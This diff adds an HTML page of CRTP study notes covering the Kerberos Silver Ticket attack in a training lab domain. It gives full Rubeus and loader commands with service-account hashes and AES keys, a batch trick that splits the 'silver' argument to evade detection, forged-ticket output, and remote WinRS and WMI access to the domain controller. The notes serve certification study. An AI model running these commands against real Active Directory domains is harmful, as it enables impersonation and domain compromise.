@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTP Part 7 - Silver Ticket | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+      max-width: 100%;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content ul, .goad-content ol {
+      color: var(--light-gray);
+      margin: 20px 0;
+      padding-left: 40px;
+      font-size: 20px;
+    }
+    
+    .goad-content li {
+      margin-bottom: 10px;
+      color: var(--light-gray);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+    
+    .goad-content blockquote {
+      border-left: 3px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray);
+      font-style: italic;
+      font-size: 20px;
+    }
+    
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+    }
+    
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: block;
+      padding: 10px 15px;
+      border-radius: 8px;
+      transition: all 0.3s;
+      font-size: 16px;
+    }
+    
+    .goad-sidebar-list a:hover,
+    .goad-sidebar-list a.active {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .goad-sidebar-list a.active {
+      background: var(--orange-yellow-crayola);
+      color: var(--eerie-black-1);
+      font-weight: var(--fw-500);
+    }
+    
+    .back-link {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+    
+    .back-link:hover {
+      color: var(--orange-yellow-crayola);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-powershell-overview.html">PowerShell Overview</a></li>
+          <li><a href="part-2-powershell-detections.html">PowerShell Detections</a></li>
+          <li><a href="part-3-enumeration.html">Enumeration</a></li>
+          <li><a href="part-4-privilege-escalation.html">Privilege Escalation</a></li>
+          <li><a href="part-5-privesc-domain-admin.html">Privilege Escalation via Domain Admin</a></li>
+          <li><a href="part-6-golden-ticket.html">Golden Ticket</a></li>
+          <li><a href="part-7-silver-ticket.html" class="active">Silver Ticket</a></li>
+          <li><a href="part-8-diamond-ticket.html">Diamond Ticket</a></li>
+          <li><a href="part-9-dsrm-credentials.html">Abusing DSRM Credentials</a></li>
+          <li><a href="part-10-dcsync-attack.html">DCSync Attack</a></li>
+          <li><a href="part-11-security-descriptor.html">Security Descriptor Abuse</a></li>
+          <li><a href="part-12-asrep-roasting.html">ASREP-Roasting Attack</a></li>
+          <li><a href="part-13-unconstrained-delegation.html">Unconstrained Delegation</a></li>
+          <li><a href="part-14-constrained-delegation.html">Constrained Delegation</a></li>
+          <li><a href="part-15-rbcd.html">Resource-Based Constrained Delegation</a></li>
+          <li><a href="part-16-enterprise-trust-ticket.html">Enterprise Trust - SID-History with Trust Ticket</a></li>
+          <li><a href="part-17-enterprise-krbtgt.html">Enterprise Trust - SID-History with KRBTGT</a></li>
+          <li><a href="part-18-crossforest-trust.html">CrossForest Trust - Trust Flow</a></li>
+          <li><a href="part-19-adcs-attacks.html">ADCS Attacks</a></li>
+          <li><a href="part-20-trust-links.html">Trust Links Abuse</a></li>
+          <li><a href="part-21-mde-mdi-bypass.html">MDE/MDI Bypass</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-content">
+
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Silver Ticket</header>
+        
+        <section class="goad-content">
+          
+<h1>CRTP - Certified Red Team Professional</h1>
+
+
+<h2>Silver Ticket</h2>
+
+
+<p>The Silver Ticket attack involves the exploitation of service tickets in Active Directory (AD) environments. </p>
+<p>This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.</p>
+
+<p>In other words a Silver Ticket is a forged Kerberos service ticket that allows an attacker to authenticate to a specific service within a domain. It is created by an attacker who has already compromised a user account and obtained the NTLM hash of a service account password.</p>
+<h2>Difference between Silver and Golden Tickets</h2>
+
+
+<p>1. Scope of Access:</p>
+<p>1. Detection Difficulty:</p>
+<p>1. Persistence:</p>
+<h2>Advantages of Using a Silver Ticket</h2>
+
+
+<p>1. Stealth: Silver Tickets are more stealthy than Golden Tickets because they do not involve communication with the Domain Controller, making them harder to detect.</p>
+<p>1. Targeted Access: Silver Tickets provide access only to the specific service they are forged for, rather than the entire domain. This can be advantageous if the attacker's goal is to target a specific service or resource.</p>
+<p>1. Persistence: While Golden Tickets provide longer-term persistence, Silver Tickets can still be useful for an attacker who needs to maintain access to a specific service or resource for a limited period.</p>
+<p>1. Lateral Movement: An attacker can use a Silver Ticket to move laterally within the network by compromising additional service accounts and creating new Silver Tickets for those services.</p>
+<p>While Golden Tickets provide more comprehensive access to the domain, Silver Tickets can be a valuable tool for attackers who need to maintain stealthy, targeted access to specific services or resources within the network. The choice between using a Silver Ticket or a Golden Ticket will depend on the attacker's specific goals and the level of risk they are willing to take.</p>
+
+<p>Usually Kerberos tickets are verified by the 3rd party Privileged Account Certificate (PAC). Service accounts, for some reason, aren’t always checked, which is ultimately what makes this attack work. Services are low-level applications like CIFS, Windows Firewall, or Print Spooler.</p>
+
+<h2>How Silver Ticket Attacks Work</h2>
+
+
+<p>To execute a silver ticket attack, an attacker needs to already have control of a compromised target in the system environment. This initial compromise can come in any form of cyberattack or malware. Once the attacker has a way in, a silver ticket attack follows a step-by-step process to forge authorization credentials.</p>
+<h1>Silver Ticket With Rubeus</h1>
+
+
+<h3>Step 1. Gather information about the domain and the targeted local service. </h3>
+
+
+<p>This involves discovering the domain security identifier and the DNS name of the service the attack is intended for.</p>
+<p>We can gather then Domain SID information by importing PowerView modules. For this importing mechanism we do have 2 ways to import modules.</p>
+<p>First option is using a dot sourcing mechanism.</p>
+<p>. .\PowerView.ps1</p>
+<p>Second option is using Import-Module.</p>
+<p>Import-Module PowerView.ps1</p>
+<p>The we can request the Domain SID with the following command.</p>
+<p>Get-DomainSID</p>
+<img src="./images/screenshot_77.png" alt="">
+
+
+<p>Domain-SID: S-1-5-21-719815819-3726368948-3917688648</p>
+
+<p>For the DNS name of the service of the attack is intended for, we will be using dcorp-dc.dollarecorp.moneycorp.local which is the DNS name of the target service account DCORP-DC$. </p>
+<p>Last but not least, we will be abusing HTTP and WMI.</p>
+
+<h3>Step 2. Use a tool to obtain the local NTLM hash, or password hash, for the Kerberos service. </h3>
+
+
+<p>An NTLM hash can be gathered from the local service account or security account manager of a compromised system.</p>
+<p>Let’s just assume that we were able to compromise the following service or computer account: </p>
+<p>Account: DCORP-DC$</p>
+<p>NTLM-HASH: 0cfa3b5634cebb44153fa03a3767d396</p>
+<p>AES256: 14b490c2eee6dee2c3e811ed7d0192e3aad615c093348ea42259a498f4eeaae9</p>
+
+<p>Note: an RC4, AES256 or AES128 can also be used… In fact using AES256 is more stealthy that using plaintext credentials or NTLM hashes for example.</p>
+
+<h3>Step 3. Forge a Kerberos Ticket Granting Service, which allows the attacker to authenticate their targeted service.</h3>
+
+
+<p>PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only, it is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>“silver”</p>
+<pre><code>set "z=r"
+set "y=e"
+set "x=v"
+set "w=l"
+set "v=i"
+set "u=s"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>Once we have done the copy/past of the encoded “silver” to the CMD, we can carry on and forge the Silver Ticket using Rubeus.exe.</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:http/dcorp-dc.dollarcorp.moneycorp.local /aes256:14b490c2eee6dee2c3e811ed7d0192e3aad615c093348ea42259a498f4eeaae9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt</p>
+<pre><code>[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
+[*] SID            : S-1-5-21-719815819-3726368948-3917688648
+[*] UserId         : 500
+[*] Groups         : 544,512,520,513
+[*] ServiceKey     : 14B490C2EEE6DEE2C3E811ED7D0192E3AAD615C093348EA42259A498F4EEAAE9
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] KDCKey         : 14B490C2EEE6DEE2C3E811ED7D0192E3AAD615C093348EA42259A498F4EEAAE9
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] Service        : http
+[*] Target         : dcorp-dc.dollarcorp.moneycorp.local
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGS for 'Administrator' to 'http/dcorp-dc.dollarcorp.moneycorp.local'
+
+[*] AuthTime       : 6/4/2024 4:26:18 PM
+[*] StartTime      : 6/4/2024 4:26:18 PM
+[*] EndTime        : 6/5/2024 2:26:18 AM
+[*] RenewTill      : 6/11/2024 4:26:18 PM
+
+[*] base64(ticket.kirbi):
+
+      doIGKjCCBiagAwIBBaEDAgEWooIE3TCCBNlhggTVMIIE0aADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
+      T1JQLkxPQ0FMojYwNKADAgECoS0wKxsEaHR0cBsjZGNvcnAtZGMuZG9sbGFyY29ycC5tb25leWNvcnAu
+      bG9jYWyjggRyMIIEbqADAgESoQMCAQOiggRgBIIEXL/4yNuGbrIhpQm7t/LgWB41v4shVw+FYurwNpix
+      XeCK5woPZIsNBjT9s5nAJ6HgymyeRMKFQTEA6jAKUKVg4YAw/X4jYk5aPRB6KFEhG8AdkerNt4B2p9Vx
+      kDJnNeVX9YjyRuPQCLiq4/4U8YDGg3HiVX0ojkItjZO1VoQLHDHa1tuNg+r4SivWWq9jkGOABdyrKJ7l
+      9TR5593A4N1RsYkYxr+CZ5MKc24P7f5eSP4xJp0hTBHBzHzTXttk4OlpUReGH3DkVnsyP3m9IG2KqHtl
+      ei6iYno2lIKJsGTjCQOw/m1lUjxloI1cob0B2Faio5bBrpW6N+faHub9K8aoG3pIQfXH1vVov9JmjmVq
+      qETjqxRP+5rKkFgpyvhcj+lMraXKhnkejq+EFQ4MWne7KonnPknwUZ0rqWNZ8BTi5gzUoSr04wQchpeH
+      3Czd5mglSdVuura7ndyIUPfmpREFxjcgBXDouiXC0OuhxjauCorLmoUycxHcc4YpXxlTbhFUG8palpBT
+      tGFVZ0ntEUIx/BLloD/SwX5a2Otqr2pFsZQJZ5h/A/KVMbPmxX3tmZmzDEr3M8gB5umrDP3DGfzllifM
+      P2BYG03P8ZyXQwfk/16WbJ5ZarjD7rNycezLpMqTSjQ13KQWmBAJmo9zh3ZuHKOwdY1+U/KEQARcBEGm
+      BG6XSnvRfAMcGcdGFHkG1QjKOEKtrVkAo1Ct+JH4LmNZA7JZ0Hkybc1qTSltT5N1uZcfVYoKAHRGfrB4
+      9HQAHzdY37OvKzLhkYJiLvkT4jDQuBGiS7nmEXMnzE2oA0dmGKTjBPhtpl7+BhYMEAbgyZDgNtKhNPKu
+      Sy9Te6mRm9EeIDfBmPQD41V3nYMnBPnY1N68R+jfQFuunGDGpcRdze5Je8L9wF5hL9Wmumxq/zl7eOwc
+      2TQITjr1A0Bc/BTq+kdW3XzlJC45YMQEAtB1a2kEXQ9q8kF91rBrmgKYjvBYFM99mmCBcXZSuDXy76vp
+      DnVKf4nIN4xnlSK+zAO+WzYH4sLQlV6Z2GAvoyw2iPjY01WCdk6AL51DvwJVoB6dDBBIoRsfD2Qk637J
+      /43wq9He/lvPQllwWfGNkcPSkxfaQSQ91yQF1LJKb4PKx6POy6bGP7cHKSE2WbcTJWnKI/D+CnG4jGPd
+      OP3J5krjWXUNBnt31fKebitdmFonqz5LNGRiWFaUHd5hZLFCSzHqerh+zegVKMMsRrCotiHfMy9w8HQJ
+      Ahj541vOGuI2RlmZYrwQu5DJF6g9pJqJWu72JAx6CMeLpW5ppJ1W7/dbHQDIFY1usVhjD7uvoXEDGhEl
+      eemrYYTOWSh8+xYyhQuwGiNweU6N2lxaxCyIgwEEulwRuHVgU5YMbyvN3kri4NcfzIQ0msaLEP+FEJRL
+      2um+s3BznUeaOAo5nMxxmdmdGp6h4u45NGi4vaVCMJ9gI/Y1mjB3H562geJFXwozz9CIndkm+znKTzH5
+      /0BsOFvGhqOCATcwggEzoAMCAQCiggEqBIIBJn2CASIwggEeoIIBGjCCARYwggESoCswKaADAgESoSIE
+      ILsuvXDYADyIlhMhcEGBz9sfovgpJK/q5FnhFJE+3spooRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxP
+      Q0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKAAAKQRGA8yMDI0MDYwNDIzMjYxOFql
+      ERgPMjAyNDA2MDQyMzI2MThaphEYDzIwMjQwNjA1MDkyNjE4WqcRGA8yMDI0MDYxMTIzMjYxOFqoHBsa
+      RE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypNjA0oAMCAQKhLTArGwRodHRwGyNkY29ycC1kYy5kb2xs
+      YXJjb3JwLm1vbmV5Y29ycC5sb2NhbA==
+
+
+[+] Ticket successfully imported!</code></pre>
+
+
+<p>Amazing… we were able to forge the Silver Ticket.</p>
+
+<p>We can check the Cached Ticket to confirm if we are Administrator at the domain.</p>
+<p>klist</p>
+<pre><code>Current LogonId is 0:0x3ec41
+
+Cached Tickets: (1)
+
+#0&gt;     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: http/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a00000 -&gt; forwardable renewable pre_authent
+        Start Time: 6/4/2024 16:26:18 (local)
+        End Time:   6/5/2024 2:26:18 (local)
+        Renew Time: 6/11/2024 16:26:18 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:</code></pre>
+
+
+<p>We have the HTTP service ticket for DCORP-DC.</p>
+<p>Step 5. Use the forged tickets for financial gain or to further corrupt a system, depending on the attacker’s objective.</p>
+<p>Once the attacker obtains the forged silver ticket, they can run code as the targeted local system. They can then elevate their privileges on the local host and start moving laterally within the compromised environment or even create a golden ticket. This gives them access to more than the originally targeted service and is a tactic for avoiding cybersecurity prevention measures.</p>
+<p>Now let’s try to access the service using WinRS.</p>
+<p>Let’s pay attention  that we do have the FQDN as dcorp-dc.dolarcorp.moneycorp.local in our ticket, so we need to use the full name when accessing the service via WinRS.</p>
+<p>winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd</p>
+<img src="./images/screenshot_78.png" alt="">
+
+
+
+<h1>Using BetterSafetyKatz for WMI</h1>
+
+
+<p>For accessing WMI, we need to create two tickets - one for HOST service and another for RPCSS. </p>
+<p>We could also use Rubeus for this but let’s use BetterSafetyKatz.</p>
+
+<h3>Step 1. Gather information about the domain and the targeted local service. </h3>
+
+
+<p>This involves discovering the domain security identifier and the DNS name of the service the attack is intended for.</p>
+<p>We can gather then Domain SID information by importing PowerView modules. For this importing mechanism we do have 2 ways to import modules.</p>
+<p>First option is using a dot sourcing mechanism.</p>
+<p>. .\PowerView.ps1</p>
+<p>Second option is using Import-Module.</p>
+<p>Import-Module PowerView.ps1</p>
+<p>The we can request the Domain SID with the following command.</p>
+<p>Get-DomainSID</p>
+<img src="./images/screenshot_79.png" alt="">
+
+
+<p>Domain-SID: S-1-5-21-719815819-3726368948-3917688648</p>
+
+<p>NOTE: If you receive the error below trying to execute any PowerView request, It occur when machine or user is not part of domain or not communicating with domain.</p>
+<p>In this case, make sure that you are executing PowerView as a valid domain user.</p>
+<img src="./images/screenshot_80.png" alt="">
+
+
+
+
+
+<p>For the DNS name of the service of the attack is intended for, we will be using dcorp-dc.dollarecorp.moneycorp.local which is the DNS name of the target service account DCORP-DC$. Last but not least, we will be abusing HTTP and WMI.</p>
+
+<h3>Step 2. Use a tool to obtain the local NTLM hash, or password hash, for the Kerberos service. </h3>
+
+
+<p>An NTLM hash can be gathered from the local service account or security account manager of a compromised system.</p>
+<p>Let’s just assume that we were able to compromise the following service or computer account: </p>
+<p>Account: DCORP-DC$</p>
+<p>NTLM-HASH: 0cfa3b5634cebb44153fa03a3767d396</p>
+<p>AES256: 14b490c2eee6dee2c3e811ed7d0192e3aad615c093348ea42259a498f4eeaae9</p>
+
+<p>Note: an RC4, AES256 or AES128 can also be used… In fact using AES256 is more stealthy that using plaintext credentials or NTLM hashes for example.</p>
+<h3>Step 3. Forge a Kerberos Ticket Granting Service, which allows the attacker to authenticate their targeted service.</h3>
+
+
+<p>PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only, it is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>silver</p>
+<pre><code>set "z=r"
+set "y=e"
+set "x=v"
+set "w=l"
+set "v=i"
+set "u=s"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>Now that we have create the encode for the Silver word, let’s load Rubeus.exe using PELoader.exe.</p>
+
+<p>Using Rubeus.exe for HOST:</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:host/dcorp dc.dollarcorp.moneycorp.local /aes256:14b490c2eee6dee2c3e811ed7d0192e3aad615c093348ea42259a498f4eeaae9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt</p>
+<p>Using Rubeus.exe for RPCSS:</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:rpcss/dcorp dc.dollarcorp.moneycorp.local /aes256:14b490c2eee6dee2c3e811ed7d0192e3aad615c093348ea42259a498f4eeaae9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt</p>
+<img src="./images/screenshot_81.png" alt="">
+
+
+<p>After executing Rubeus we can see that we were able to forge the Silver Ticket for HOST and RPCSS.</p>
+<p>We can confirm that by checking our Cached Tickets.</p>
+<p>klist</p>
+<img src="./images/screenshot_82.png" alt="">
+
+
+<p>Amazing, we have both Tickets… Now, let’s try running WMI commands on the domain controller:</p>
+<p>Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc</p>
+<img src="./images/screenshot_83.png" alt="">
+
+
+<p>We have access to Domain Controller.</p>
+
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-6-golden-ticket.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">&larr; Previous: Part 6</a>
+  <a href="part-8-diamond-ticket.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 8 &rarr;</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
